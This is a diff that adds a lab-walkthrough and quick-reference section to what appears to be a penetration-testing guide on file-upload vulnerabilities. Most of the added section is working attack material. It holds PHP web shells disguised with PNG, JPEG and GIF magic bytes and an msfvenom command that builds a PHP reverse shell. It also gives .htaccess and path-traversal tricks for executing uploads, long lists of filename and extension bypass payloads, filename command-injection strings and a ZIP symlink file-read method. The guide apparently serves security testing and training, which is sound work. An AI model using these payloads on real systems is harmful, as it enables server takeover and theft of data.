@@ -236,6 +236,137 @@ file check.bin && xxd check.bin | head -3
 - Include the validation observed and the single bypass that worked (e.g. "extension allowlist enforced, but `Content-Type` trusted and `.phtml` is server-mapped").
 - Fix: allowlist extensions AND verify magic bytes AND re-encode images; store outside webroot; serve with `Content-Disposition: attachment`; no execution in upload dir (`php_flag engine off`); randomize filenames; scan asynchronously — never trust client `Content-Type`.
 
+## Lab walkthroughs & quick reference
+
+### PortSwigger lab: Web shell upload via path traversal
+
+1. Upload `shell.php` — the server returns it as plain text (stored, but not executed)
+2. Inspect the upload request in Burp: `Content-Disposition: form-data; name="avatar"; filename="exploit.php"`
+3. Modify the filename to escape the upload directory:
+```http
+Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fexploit.php"
+```
+4. Request the stored file again — the server now executes it as PHP
+
+### PortSwigger lab: Web shell upload via extension blacklist bypass
+
+1. Upload a PHP shell — the app blocks `.php`
+2. Upload a file named `.htaccess` (itself not blacklisted) with contents:
+```apache
+AddType application/x-httpd-php .l33t
+```
+3. Upload the same shell renamed `exploit.php` → `exploit.l33t`
+4. Request `exploit.l33t` — Apache now executes it as PHP
+
+### Zip extraction → arbitrary file read (symlink)
+
+When an upload accepts ZIP archives that get auto-extracted, extract the archive server-side but ship a symlink inside:
+
+```bash
+mkdir /tmp/zipupload
+ln -s ../../../index.php /tmp/zipupload/index.txt   # point at the file you want to read
+cd /tmp/zipupload
+zip -y /tmp/zipupload.zip index.txt                 # -y stores the symlink itself
+```
+
+Upload `zipupload.zip`. When the app extracts and serves `index.txt`, it follows the symlink and returns `../../../index.php` contents.
+
+### Extension quick reference (build your fuzz list from these)
+
+PHP:
+```text
+.php .phtml .php3 .php4 .php5 .php7 .php8 .phps .pht .phpt .phar .phtm .pgif .inc .pHp
+```
+
+ASP.NET / classic ASP / IIS (also try semicolon/colon variants):
+```text
+.asp .aspx .ashx .asmx .ascx .asax .asa .cer .cdx .config .soap .cshtml .svc
+.asp;1.jpg .aspx;1.jpg .asp:.jpg .aspx:.jpg
+```
+
+Filename bypass characters:
+```text
+%20  %0a  %00  %0d0a  /  .\  .  ...  :
+```
+
+Filename manipulation examples (paste into Intruder/ffuf as the filename):
+```text
+shell%20.php.jpg        shell.php%20.jpg        shell.jpg%20.php        shell.jpg.php%20
+shell%0a.php.jpg        shell.php%0a.jpg        shell.jpg%0a.php        shell.jpg.php%0a
+shell%00.php.jpg        shell.php%00.jpg        shell.jpg%00.php        shell.jpg.php%00
+shell%0d0a.php.jpg      shell.php%0d0a.jpg      shell.jpg%0d0a.php      shell.jpg.php%0d0a
+shell/.php.jpg          shell.php/.jpg          shell.jpg/.php          shell.jpg.php/
+shell.\.php.jpg         shell.php.\.jpg         shell.jpg.\.php         shell.jpg.php.\
+shell..php.jpg          shell.php..jpg          shell.jpg..php          shell.jpg.php.
+shell….php.jpg          shell.php….jpg          shell.jpg….php          shell.jpg.php…
+shell:.php.jpg          shell.php:.jpg          shell.jpg:.php          shell.jpg.php:
+do.php%00.png           do.php%0A.png           do.php%0D.png           do.php%0D%0A.png
+do.php%09.png           do.php%20.png           do.php%23.png           do.php%3B.png
+do.php%2E.png           do.php%252Epng          do.php%252F.png         do.php%2523.png
+do.php%2500.png         do.php%250A.png         do.php%250D.png
+do.php.png              do.php.jpg              do.php.jpeg             do.php.gif
+do.php.txt.png          do.php.jpg.png          do.php.jpeg.jpg         do.php.png.jpg
+do.php;.png             do.PHP.png              do.PhP.png              do.pHp.png
+DO.php.png              do.php.PNG              do.php.PnG
+do%2Ephp.png            do%2ephp.png            do.php%2epng            do%252Ephp.png
+do.php/.png             do.php%2F.png           do.php%5C.png           do.php\.png
+do.php/..png            do.php%2e%2e%2f.png
+```
+
+### Path traversal in filename — variants
+
+```text
+../shell.php
+../../shell.php
+../../../var/www/shell.php
+..%2fshell.php
+..%252fshell.php
+..%c0%afshell.php        (overlong UTF-8, legacy Java servers)
+shell.php%00.jpg
+shell.php\x00.jpg
+```
+
+### Magic-byte quick one-liners
+
+```bash
+# PNG
+echo -e "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system(\$_GET['cmd']); ?>" > shell.php
+# JPEG
+echo -e "\xFF\xD8\xFF<?php system(\$_GET['cmd']); ?>" > shell.php
+# GIF
+echo "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.php
+```
+
+### PHP reverse shell (msfvenom)
+
+```bash
+msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
+```
+
+### Useful PHP functions reference
+
+```php
+exec()  system()  shell_exec()  passthru()  file_get_contents()  file_put_contents()
+```
+
+### Filename → command injection
+
+If the app uses uploaded filenames in OS commands (`convert "uploads/<filename>"`), the filename itself is an injection point:
+
+```text
+file$(whoami).jpg
+file`whoami`.jpg
+file.jpg||whoami
+```
+
+### File-read-only proof payload
+
+When you want a lower-risk PoC instead of a full webshell:
+
+```php
+<?php file_get_contents('file_path'); ?>
+```
+
 ## References
 
 - [PortSwigger — File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
